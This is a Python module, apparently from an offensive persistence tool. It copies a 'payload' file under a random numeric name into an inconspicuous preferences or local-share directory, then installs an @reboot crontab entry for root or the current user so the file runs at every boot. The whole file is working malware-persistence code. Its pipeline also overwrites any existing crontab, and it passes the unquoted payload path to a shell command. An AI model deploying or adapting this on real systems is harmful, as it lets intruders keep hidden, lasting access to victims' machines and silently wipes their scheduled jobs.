"""
cronjob.py: Unix-specific cronjob logic.
"""
import os
import sys
import random
import getpass
import logging
import subprocess

from pathlib import Path

from ..error_wrapper import SubprocessErrorLogging


class Cronjob:
    """
    Unix-specific cronjob logic.
    """
    def __init__(self, payload: str) -> None:
        self.payload = payload


    def _current_user(self) -> str:
        """
        Get the current user's username.
        """
        try:
            return os.getlogin()
        except OSError:
            # Reference: https://bugs.python.org/issue40821
            return getpass.getuser()


    def _root_user(self) -> str:
        """
        Get the root user's username.
        """
        return "root"


    def _relocate_payload(self) -> str:
        """
        Relocate the payload to a temporary directory.
        """
        if sys.platform == "darwin":
            directory = f"/Users/{self._current_user()}/Library/Preferences"
        else:
            directory = f"/home/{self._current_user()}/.local/share"

        if not Path(directory).exists():
            Path(directory).mkdir(parents=True, exist_ok=True)

        payload_name = f"{random.randint(0, 1000000)}"
        new_payload = Path(directory) / payload_name

        result = subprocess.run(["cp", self.payload, new_payload], capture_output=True, text=True)
        if result.returncode != 0:
            SubprocessErrorLogging(result).log()
            raise Exception(f"Failed to relocate payload to {new_payload}.")

        return new_payload


    def _generate_cronjob_invocation(self, payload: str, user: str) -> str:
        """
        Generate a cronjob invocation for the specified user.
        """

        cronjob_command = f"@reboot {payload}\n"
        cronjob_invocation = f"(crontab -l 2>/dev/null | echo \"{cronjob_command}\")"

        # Cannot use crontab -u as non-root user.
        if os.geteuid() == 0:
            cronjob_invocation += f" | crontab -u {user} -"
        else:
            cronjob_invocation += " | crontab -"

        return cronjob_invocation


    def _install_cronjob(self, user: str) -> None:
        """
        Install the payload as a cronjob under the specified user.
        """
        payload = self._relocate_payload()
        logging.info(f"Relocated payload to {payload}.")
        cronjob = self._generate_cronjob_invocation(payload, user)

        logging.info(f"Installing cronjob for user {user}.")
        result = subprocess.run(cronjob, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            SubprocessErrorLogging(result).log()
            raise Exception(f"Failed to install cronjob for user {user}.")

        logging.info(f"Successfully installed cronjob 🎉")


    def install_root(self) -> None:
        """
        Install the payload as a cronjob under the root user.
        """
        self._install_cronjob(self._root_user())


    def install_current_user(self) -> None:
        """
        Install the payload as a cronjob under the current user.
        """
        self._install_cronjob(self._current_user())